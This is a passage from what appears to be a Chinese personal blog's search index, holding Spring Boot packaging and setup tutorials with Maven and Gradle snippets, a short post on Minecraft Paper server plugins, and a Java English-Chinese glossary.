JdbcTemplate(dataSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Spring Boot就不会再创建一个重复的<code>JdbcTemplate</code></p><h2 id="开发者工具">开发者工具</h2><p>Spring Boot提供了一个开发者工具，可以监控classpath路径上的文件。只要源码或配置文件发生修改，Spring Boot应用可以自动重启。在开发阶段，这个功能比较有用。</p><p>要使用这一开发者功能，我们只需添加如下依赖到<code>pom.xml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>默认配置下，针对<code>/static</code>、<code>/public</code>和<code>/templates</code>目录中的文件修改，不会自动重启，因为禁用缓存后，这些文件的修改可以实时更新。</p><h2 id="打包spring-boot">打包spring boot</h2><p>在Spring Boot应用中，打包更加简单，因为Spring Boot自带一个更简单的<code>spring-boot-maven-plugin</code>插件用来打包，我们只需要在<code>pom.xml</code>中加入以下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;project ...&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package</span><br></pre></td></tr></table></figure><p>输入maven命令即可自动打包</p><p>之后可以在target看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">classes</span><br><span class="line">generated-sources</span><br><span class="line">maven-archiver</span><br><span class="line">maven-status</span><br><span class="line">springboot-exec-jar-1.0-SNAPSHOT.jar</span><br><span class="line">springboot-exec-jar-1.0-SNAPSHOT.jar.original</span><br></pre></td></tr></table></figure><p>其中，<code>springboot-exec-jar-1.0-SNAPSHOT.jar.original</code>是Maven标准打包插件打的jar包，它只包含我们自己的Class，不包含依赖，而<code>springboot-exec-jar-1.0-SNAPSHOT.jar</code>是Spring Boot打包插件创建的包含依赖的jar，可以直接运行：</p><h2 id="瘦身spring-boot">瘦身spring boot</h2><p>如何只打包我们自己编写的代码，同时又自动把依赖包下载到某处，并自动引入到classpath中。解决方案就是使用<code>spring-boot-thin-launcher</code>。</p><p>首先复制一份上一节的Maven项目，并重命名为<code>springboot-thin-jar</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;project ...&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;groupId&gt;com.itranswarp.learnjava&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;springboot-thin-jar&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>然后，修改<code>&lt;build&gt;</code>-<code>&lt;plugins&gt;</code>-<code>&lt;plugin&gt;</code>，给原来的<code>spring-boot-maven-plugin</code>增加一个<code>&lt;dependency&gt;</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;project ...&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;finalName&gt;awesome-app&lt;/finalName&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;dependencies&gt;</span><br><span class="line">                    &lt;dependency&gt;</span><br><span class="line">                        &lt;groupId&gt;org.springframework.boot.experimental&lt;/groupId&gt;</span><br><span class="line">                        &lt;artifactId&gt;spring-boot-thin-layout&lt;/artifactId&gt;</span><br><span class="line">                        &lt;version&gt;1.0.27.RELEASE&lt;/version&gt;</span><br><span class="line">                    &lt;/dependency&gt;</span><br><span class="line">                &lt;/dependencies&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><p>不需要任何其他改动了，我们直接按正常的流程打包，执行<code>mvn clean package</code>，观察<code>target</code>目录最终生成的可执行<code>awesome-app.jar</code>，只有79KB左右。****</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> spring boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mc插件开发</title>
      <link href="/2024/07/02/mc/"/>
      <url>/2024/07/02/mc/</url>
      
        <content type="html"><![CDATA[<p>进行了Mc服务器的插件开发，插件是基于mc sever paper端进行开发的，主要的插件为</p><ul><li><p>tpa插件</p></li><li><p>home插件</p></li><li><p>rank插件</p></li><li><p>joinleave插件</p><p>这些插件主要是为了服务器的玩法的完善进行开发的。</p></li></ul><p><img src="https://raw.githubusercontent.com/mengnankkkk/img/main/202407021457501.jpg" alt=""></p><p>虽然就写了一点点，但看到这里的你能不能给我一个👍。</p><p>mc服务器插件列表</p><ul><li>prompter 死亡坐标显示</li><li>backhome插件</li><li>hud显示插件</li><li>tpa插件</li><li>joinleave更好的显示</li><li>rank称号系统</li></ul><p>url:<a href="https://github.com/mengnankkkk/mc">https://github.com/mengnankkkk/mc</a></p><p><img src="https://raw.githubusercontent.com/mengnankkkk/img/main/202407021709952.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> mc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习字典</title>
      <link href="/2024/06/25/java%E5%AD%97%E5%85%B8%E6%9F%A5%E8%AF%A2/"/>
      <url>/2024/06/25/java%E5%AD%97%E5%85%B8%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章：">第一章：</h2><p>JDK(Java Development Kit) java开发工具包</p><p>JVM(Java Virtual Machine) java虚拟机</p><p>Javac 编译命令</p><p>java 解释命令</p><p>Javadoc 生成java文档命令</p><p>classpath 类路径</p><p>Version 版本</p><p>author 作者</p><p>public 公共的</p><p>class 类</p><p>static 静态的</p><p>void 没有返回值</p><p>String 字符串类</p><p>System 系统类</p><p>out 输出</p><p>print 同行打印</p><p>println 换行打印</p><p>JIT(just-in-time) 及时处理</p><h2 id="第二章：">第二章：</h2><p>byte 字节</p><p>char 字符</p><p>boolean 布尔</p><p>short 短整型</p><p>int 整形</p><p>long 长整形</p><p>float 浮点类型</p><p>double 双精度</p><p>if 如果</p><p>else 否则</p><p>switch 多路分支</p><p>case 与常值匹配</p><p>break 终止</p><p>default 默认</p><p>while 当到循环</p><p>do 直到循环</p><p>for 已知次数循环</p><p>continue结束本次循环进行下次跌代</p><p>length 获取数组元素个数</p><h2 id="第三章：">第三章：</h2><p>OOP object oriented programming 面向对象编程</p><p>Object 对象</p><p>Class 类</p><p>Class member 类成员</p><p>Class method 类方法</p><p>Class variable 类变量</p><p>Constructor 构造方法</p><p>Package 包</p><p>Import package 导入包</p><p>第四章：</p><p>Extends 继承</p><p>Base class 基类</p><p>Super class 超类</p><p>Overloaded method 重载方法</p><p>Overridden method  重写方法</p><p>Public  公有</p><p>Private 私有</p><p>Protected 保护</p><p>Static 静态</p><p>Abstract 抽象</p><p>Interface 接口</p><p>Implements interface  实现接口</p><h2 id="第五章：">第五章：</h2><p>Exception 意外，异常</p><p>RuntimeExcepiton 运行时异常</p><p>ArithmeticException 算术异常</p><p>IllegalArgumentException 非法数据异常</p><p>ArrayIndexOutOfBoundsException 数组索引越界异常</p><p>NullPointerException 空指针异常</p><p>ClassNotFoundException 类无法加载异常（类不能找到）</p><p>NumberFormatException 字符串到float类型转换异常（数字格式异常）</p><p>IOException 输入输出异常</p><p>FileNotFoundException 找不到文件异常</p><p>EOFException 文件结束异常</p><p>InterruptedException （线程）中断异常</p><p>try 尝试</p><p>catch 捕捉</p><p>finally 最后</p><p>throw 投、掷、抛</p><p>throws 投、掷、抛</p><p>print Stack Trace() 打印堆栈信息</p><p>get Message（） 获得错误消息</p><p>get Cause（） 获得异常原因</p><p>method 方法</p><p>able 能够</p><p>instance 实例</p><p>check 检查</p><h2 id="第六章：">第六章：</h2><p>byte（字节）</p><p>char（字符）</p><p>int（整型）</p><p>long（长整型）</p><p>float（浮点型）</p><p>double（双精度）</p><p>boolean（布尔）</p><p>short（短整型）</p><p>Byte （字节类）</p><p>Character （字符类）</p><p>Integer（整型类）</p><p>Long （长整型类）</p><p>Float（浮点型类）</p><p>Double （双精度类）</p><p>Boolean（布尔类）</p><p>Short （短整型类）</p><p>Digit （数字）</p><p>Letter （字母）</p><p>Lower (小写)</p><p>Upper (大写)</p><p>Space (空格)</p><p>Identifier (标识符)</p><p>Start (开始)</p><p>String (字符串)</p><p>length （值）</p><p>equals (等于)</p><p>Ignore （忽略）</p><p>compare （比较）</p><p>sub （提取）</p><p>concat （连接）</p><p>replace （替换）</p><p>trim （整理）</p><p>Buffer (缓冲器)</p><p>reverse (颠倒)</p><p>delete （删除）</p><p>append （添加）</p><p>Interrupted （中断的）</p><h2 id="第七章：">第七章：</h2><p>Date  日期，日子</p><p>After  后来，后面</p><p>Before  在前，以前</p><p>Equals  相等，均等</p><p>toString  转换为字符串</p><p>SetTime  设置时间</p><p>Display  显示，展示</p><p>Calendar  日历</p><p>Add  添加，增加</p><p>GetInstance 获得实例</p><p>getTime  获得时间</p><p>Clear  扫除，清除</p><p>Clone  克隆，复制</p><p>Util  工具，龙套</p><p>Components 成分，组成</p><p>Month  月份</p><p>Year  年，年岁</p><p>Hour  小时，钟头</p><p>Minute  分钟</p><p>Second  秒</p><p>Random  随意，任意</p><p>Next Int  下一个整数</p><p>Gaussian  高斯</p><p>ArrayList  对列</p><p>LinkedList 链表</p><p>Hash  无用信息，杂乱信号</p><p>Map  地图</p><p>Vector  向量，矢量</p><p>Size  大小</p><p>Collection 收集</p><p>Shuffle  混乱，洗牌</p><p>RemoveFirst 移动至开头</p><p>RemoveLast  移动至最后</p><p>lastElement 最后的元素</p><p>Capacity  容量，生产量</p><p>Contains  包含，容纳</p><p>Copy  副本，拷贝</p><p>Search  搜索，查询</p><p>InsertElementAt 插入元素在某一位置</p><h2 id="第八章：">第八章：</h2><p>io-&gt;in out 输入/输出</p><p>File 文件</p><p>import 导入</p><p>exists 存在</p><p>isFile 是文件</p><p>isDirectory 是目录</p><p>getName 获取名字</p><p>getPath 获取路径</p><p>getAbsolutePath 获取绝对路径</p><p>lastModified 最后修改日期</p><p>length 长度</p><p>InputStream 输入流</p><p>OutputStream 输出流</p><p>Unicode 统一的字符编码标准, 采用双字节对字符进行编码</p><p>Information 信息</p><p>FileInputStream 文件输入流</p><p>FileOutputStream文件输出流</p><p>IOException 输入输出异常</p><p>fileobject 文件对象</p><p>available 可获取的</p><p>read 读取</p><p>write 写</p><p>BufferedReader 缓冲区读取</p><p>FileReader 文本文件读取</p><p>BufferedWriter 缓冲区输出</p><p>FileWriter 文本文件写出</p><p>flush 清空</p><p>close 关闭</p><p>DataInputStream 二进制文件读取</p><p>DataOutputStream二进制文件写出</p><p>EOF 最后</p><p>encoding 编码</p><p>Remote 远程</p><p>release 释放</p><h2 id="第九章：">第九章：</h2><p>JBuider Java 集成开发环境（IDE）</p><p>Enterprise 企业版</p><p>Developer 开发版</p><p>Foundation 基础版</p><p>Messages 消息格</p><p>Structure 结构窗格</p><p>Project 工程</p><p>Files 文件</p><p>Source 源代码</p><p>Design 设计</p><p>History 历史</p><p>Doc 文档</p><p>File 文件</p><p>Edit 编辑</p><p>Search 查找</p><p>Refactor 要素</p><p>View 视图</p><p>Run 运行</p><p>Tools 工具</p><p>Window 窗口</p><p>Help 帮助</p><p>Vector 矢量</p><p>addElement 添加内容</p><p>Project Winzard 工程向导</p><p>Step 步骤</p><p>Title 标题</p><p>Description 描述</p><p>Copyright 版权</p><p>Company 公司</p><p>Aptech Limited Aptech有限公司</p><p>author  作者</p><p>Back 后退</p><p>Finish 完成</p><p>version 版本</p><p>Debug 调试</p><p>New 新建</p><p>ErrorInsight 调试</p><p>第十章：</p><p>JFrame 窗口框架</p><p>JPanel  面板</p><p>JScrollPane 滚动面板</p><p>title  标题</p><p>Dimension 尺寸</p><p>Component 组件</p><p>Swing JAVA轻量级组件</p><p>getContentPane 得到内容面板</p><p>LayoutManager 布局管理器</p><p>setVerticalScrollBarPolicy 设置垂直滚动条策略</p><p>AWT（Abstract Window Toolkit） 抽象窗口工具包</p><p>GUI （Graphical User Interface） 图形用户界面</p><p>VERTICAL_SCROLLEARAS_NEEDED 当内容大大面板出现滚动条</p><p>VERTICAL_SOROLLEARAS_ALWAYS 显示滚动条</p><p>VERTICAL_SOROLLEARAS_NEVER 不显示滚动条</p><p>JLabel 标签</p><p>Icon  图标</p><p>image 图象</p><p>LEFT  左对齐</p><p>RIGHT 右对齐</p><p>JTextField 单行文本</p><p>getColumns 得到列数</p><p>setLayout 设置布局</p><p>BorderLayout 边框布局</p><p>CENTER 居中对齐</p><p>JTextArea 多行文本</p><p>setFont 设置字体</p><p>setHorizontalAlignment 设置文本水平对齐方式</p><p>setDefaultCloseOperation 设置默认的关闭操作</p><p>add 增加</p><p>JButton 按钮</p><p>JCheckBox 复选框</p><p>JRadioButton单选按钮</p><p>addItem 增加列表项</p><p>getItemAt 得到位置的列表项</p><p>getItemCount 得到列表项个数</p><p>setRolloverIcon 当鼠标经过的图标</p><p>setSelectedIcon 当选择按钮的图标</p><p>getSelectedItem 得到选择的列表项</p><p>getSelectedIndex 得到选择的索引</p><p>ActionListener 按钮监听</p><p>ActionEvent  按钮事件</p><p>actionPerformed 按钮单击方法</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring boot(1)</title>
      <link href="/2024/06/25/spring%20boot/"/>
      <url>/2024/06/25/spring%20boot/</url>
      
        <content type="html"><![CDATA[<h1>Spring boot</h1><p>可构建的系统：Maven |Gradle|Ant|Starters</p><p>运行代码： IDE｜ Packaged｜ Maven｜ Gradle</p><p>你可以使用Spring Boot创建Java应用， 并使用 java -jar 启动它或采用传统的<br>war部署方式。</p><p>Spring Boot提供了一个可选的Maven插件， 用于创<br>建可执行jars。  下面是一个典型的pom.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;ht</span></span></span><br><span class="line"><span class="string"><span class="tag">tp://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http:/</span></span></span><br><span class="line"><span class="string"><span class="tag">/maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>myproject<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Inherit defaults from Spring Boot --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Add typical dependencies for a web application --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">35<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Package as an executable jar --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Gradle Wrapper提供一种给力的获取Gradle的方式。 它是<br>一小段脚本和库， 跟你的代码一块提交， 用于启动构建进程  下面是一个典型的 build.gradle 文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">id <span class="string">&#x27;org.springframework.boot&#x27;</span> version <span class="string">&#x27;2.0.0.RELEASE&#x27;</span></span><br><span class="line">id <span class="string">&#x27;java&#x27;</span></span><br><span class="line">&#125; j</span><br><span class="line">ar &#123;</span><br><span class="line">baseName = <span class="string">&#x27;myproject&#x27;</span></span><br><span class="line">version = <span class="string">&#x27;0.0.1-SNAPSHOT&#x27;</span></span><br><span class="line">&#125; r</span><br><span class="line">epositories &#123;</span><br><span class="line">jcenter()</span><br><span class="line">&#125; d</span><br><span class="line">ependencies &#123;</span><br><span class="line"><span class="keyword">compile</span>(<span class="string">&quot;org.springframework.boot:spring-boot-starter-web&quot;</span>)</span><br><span class="line">testCompile(<span class="string">&quot;org.springframework.boot:spring-boot-starter-te</span></span><br><span class="line"><span class="string">st&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建一个简单的spring-boot应用">创建一个简单的spring boot应用</h2><h3 id="创建pom文件">创建pom文件</h3><p>创建一个Maven pom.xml 文件作为开始  ，打开你最喜欢的文本编辑器， 并添加以下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;ht</span></span></span><br><span class="line"><span class="string"><span class="tag">tp://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http:/</span></span></span><br><span class="line"><span class="string"><span class="tag">/maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>myproject<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Additional lines to be added here... --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="简单的java文件">简单的java文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line"><span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">String <span class="title function_">home</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125; p</span><br><span class="line">ublic <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">SpringApplication.run(Example.class, args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注解">注解</h4><p>Example类上使用的第一个注解是 @RestController ， 这被称为构造型<br>（ stereotype） 注解。 它为阅读代码的人提供暗示（ 这是一个支持REST的控制<br>器） ， 对于Spring， 该类扮演了一个特殊角色。 在本示例中， 我们的类是一个web<br>@Controller ， 所以当web请求进来时， Spring会考虑是否使用它来处理。<br>@RequestMapping 注解提供路由信息， 它告诉Spring任何来自/路径的HTTP请求<br>都应该被映射到 home 方法。 @RestController 注解告诉Spring以字符串的形式<br>渲染结果， 并直接返回给调用者。</p><p>第二个类级别的注解是 @EnableAutoConfiguration ， 这个注解告诉Spring Boot<br>根据添加的jar依赖猜测你想如何配置Spring。 由于 spring-boot-starter-web 添<br>加了Tomcat和Spring MVC， 所以auto-configuration假定你正在开发一个web应<br>用， 并对Spring进行相应地设置。</p><h4 id="main方法">main方法</h4><p>应用程序的最后部分是main方法， 这是一个标准的方法， 它遵循Java对于一个应用<br>程序入口点的约定。 我们的main方法通过调用 run ， 将业务委托给了Spring Boot<br>的SpringApplication类。 SpringApplication将引导我们的应用， 启动Spring， 相应<br>地启动被自动配置的Tomcat web服务器。 我们需要将 Example.class 作为参数传<br>递给 run 方法， 以此告诉SpringApplication谁是主要的Spring组件， 并传递args数<br>组以暴露所有的命令行参数。</p><h4 id="创建可执行的jar包">创建可执行的jar包</h4><p>为了创建可执行的jar， 我们需要将 spring-boot-maven-plugin 添加<br>到 pom.xml 中， 在dependencies节点后面插入以下内容：</p><p>然后mvn package进行打包</p><h4 id="继承">继承</h4><p>如果你想配置项目， 让其继承自 spring-boot-starter-parent ， 只需<br>将 parent 按如下设置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Inherit defaults from Spring Boot --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果你不想使用 spring-boot-starter-parent ， 通过设置 scope=import 的依<br>赖， 你仍能获取到依赖管理的好处：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 